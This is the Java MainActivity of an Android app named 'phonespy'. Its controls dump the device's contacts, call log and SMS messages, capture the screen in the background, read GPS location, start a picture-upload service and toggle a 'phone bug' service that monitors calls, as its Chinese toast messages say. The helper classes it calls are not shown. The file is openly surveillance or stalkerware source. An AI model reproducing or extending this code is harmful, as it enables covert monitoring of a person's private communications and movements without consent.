package info.peoce.phonespy.Activity;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.io.Serializable;

import info.peoce.phonespy.App;
import info.peoce.phonespy.Listener.LocationListener;
import info.peoce.phonespy.R;
import info.peoce.phonespy.Server.PhoneBugServer;
import info.peoce.phonespy.Server.ScreenCaptureServer;
import info.peoce.phonespy.Server.UploadPicServer;
import info.peoce.phonespy.Util.Others;
import info.peoce.phonespy.Util.SpyContactsInfo;
import info.peoce.phonespy.Util.SpyScreen;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {
    TextView textView;
    Button button1, button2, button3, button4;
    Intent bg_screenCap;
    MyHandler myHandler = new MyHandler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);


        textView = (TextView) findViewById(R.id.tv1);
        button1 = (Button) findViewById(R.id.bt1);
        button2 = (Button) findViewById(R.id.bt2);
        button3 = (Button) findViewById(R.id.bt3);
        button4 = (Button) findViewById(R.id.bt4);

        button1.setOnClickListener(this);
        button2.setOnClickListener(this);
        button3.setOnClickListener(this);
        button4.setOnClickListener(this);


    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.action_screensaver:
                SpyScreen.screenShot(MainActivity.this);
                Toast.makeText(this, "截屏成功", Toast.LENGTH_SHORT).show();
                break;
            case R.id.action_getlocation:
                LocationListener locationListener = new LocationListener(App.getContext());
                if (locationListener.canGetLocation()) {
                    textView.setText("latitude: " + locationListener.getLatitude() + "\n" +
                            "longtitude: " + locationListener.getLongitude());
                } else {
                    textView.setText("can not position phone");
                }
                break;
            case R.id.action_screensaverBack:
                bg_screenCap = new Intent(this, ScreenCaptureServer.class);
                App.setHandler(myHandler);
                startService(bg_screenCap);
                break;
            case R.id.action_stopScreensaver:
                stopService(bg_screenCap);
                break;
            case R.id.action_uploadPic:
                Intent intent = new Intent(this, UploadPicServer.class);
                startService(intent);
                break;
        }

        return super.onOptionsItemSelected(item);
    }

    @Override
    public void onClick(View view) {
        switch (view.getId()) {
            case R.id.bt1:
                textView.setText(SpyContactsInfo.getContactsList());
                break;
            case R.id.bt2:
                textView.setText(SpyContactsInfo.getCallLog());
                break;
            case R.id.bt3:
                textView.setText(SpyContactsInfo.getMessageList());
                break;
            case R.id.bt4:
                if (!new Others().checkServerAlive(PhoneBugServer.class.getName())) {
                    startService(new Intent(this, PhoneBugServer.class));
                    Toast.makeText(App.getContext(), "监听通话服务开启", Toast.LENGTH_SHORT).show();
                    button4.setText("STOP PHONE BUG");
                } else {
                    stopService(new Intent(this, PhoneBugServer.class));
                    Toast.makeText(App.getContext(), "监听通话服务关闭", Toast.LENGTH_SHORT).show();
                    button4.setText("START PHONE BUG");
                }
                break;
        }

    }

    public class MyHandler extends Handler implements Serializable {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            if (msg.what == 0) {
                textView.setText(textView.getText() + "\n" + String.valueOf(msg.obj));
            }
        }
    }
}
